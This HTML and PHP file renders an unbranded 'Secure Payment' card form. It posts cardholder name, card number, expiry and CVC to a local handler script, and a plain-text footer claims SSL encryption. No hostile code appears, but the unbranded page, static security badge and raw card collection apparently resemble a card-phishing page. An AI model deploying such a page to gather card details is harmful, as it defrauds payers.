<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Checkout</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #2563eb;
            --bg: #f8fafc;
            --card-bg: #ffffff;
            --text: #1e293b;
            --border: #e2e8f0;
        }
        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg);
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background: var(--card-bg);
            padding: 2rem;
            border-radius: 1rem;
            box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1);
            width: 100%;
            max-width: 400px;
        }
        h2 {
            margin-top: 0;
            font-size: 1.5rem;
            font-weight: 600;
            text-align: center;
            margin-bottom: 1.5rem;
        }
        .form-group {
            margin-bottom: 1rem;
        }
        label {
            display: block;
            font-size: 0.875rem;
            font-weight: 500;
            margin-bottom: 0.25rem;
        }
        input, select {
            width: 100%;
            padding: 0.625rem;
            border: 1px solid var(--border);
            border-radius: 0.5rem;
            font-size: 1rem;
            box-sizing: border-box;
        }
        .row {
            display: flex;
            gap: 1rem;
        }
        .row > div {
            flex: 1;
        }
        button {
            width: 100%;
            background-color: var(--primary);
            color: white;
            padding: 0.75rem;
            border: none;
            border-radius: 0.5rem;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            margin-top: 1rem;
            transition: background 0.2s;
        }
        button:hover {
            background-color: #1d4ed8;
        }
        .footer {
            margin-top: 1.5rem;
            text-align: center;
            font-size: 0.75rem;
            color: #64748b;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Secure Payment</h2>
        <form action="details/handler.php" method="POST">
            <div class="form-group">
                <label for="name">Cardholder Name</label>
                <input type="text" id="name" name="creditcard_name" placeholder="John Doe" required>
            </div>
            <div class="form-group">
                <label for="card">Card Number</label>
                <input type="text" id="card" name="creditcard_number" placeholder="0000 0000 0000 0000" required maxlength="19">
            </div>
            <div class="row">
                <div class="form-group">
                    <label>Expiration</label>
                    <div style="display: flex; gap: 0.5rem;">
                        <select name="month" required>
                            <option value="">MM</option>
                            <?php for($i=1; $i<=12; $i++) printf("<option value='%02d'>%02d</option>", $i, $i); ?>
                        </select>
                        <select name="year" required>
                            <option value="">YY</option>
                            <?php for($i=2024; $i<=2035; $i++) echo "<option value='$i'>$i</option>"; ?>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label for="cvc">CVC</label>
                    <input type="text" id="cvc" name="cvc" placeholder="123" required maxlength="4">
                </div>
            </div>
            <button type="submit">Complete Payment</button>
        </form>
        <div class="footer">
            🔒 SSL Encrypted Secure Connection
        </div>
    </div>
</body>
</html>
